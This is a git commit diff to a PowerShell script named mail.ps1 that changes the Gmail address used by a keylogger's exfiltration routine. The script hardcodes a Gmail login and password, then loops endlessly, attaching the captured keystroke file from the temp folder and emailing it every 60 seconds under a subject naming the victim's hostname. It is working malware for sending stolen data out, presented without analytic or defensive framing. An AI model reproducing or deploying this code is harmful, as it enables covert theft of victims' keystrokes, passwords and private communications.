81ef11780e0d4497661b0b554c05a3f3afface5c
DennisMejicanos <dennis.mejicanos@galileo.edu>
2019-10-25 11:04:20 -0600

    Update mail.ps1

--- mail.ps1
+++ mail.ps1
@@ -1,9 +1,9 @@
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('correorubber@gmail.com', 'Cisco123')
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('correrorubber@gmail.com', 'Cisco123')
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'correorubber@gmail.com'
-$ReportEmail.To.Add('correorubber@gmail.com')
+$ReportEmail.From = 'correrorubber@gmail.com'
+$ReportEmail.To.Add('correrorubber@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 60}
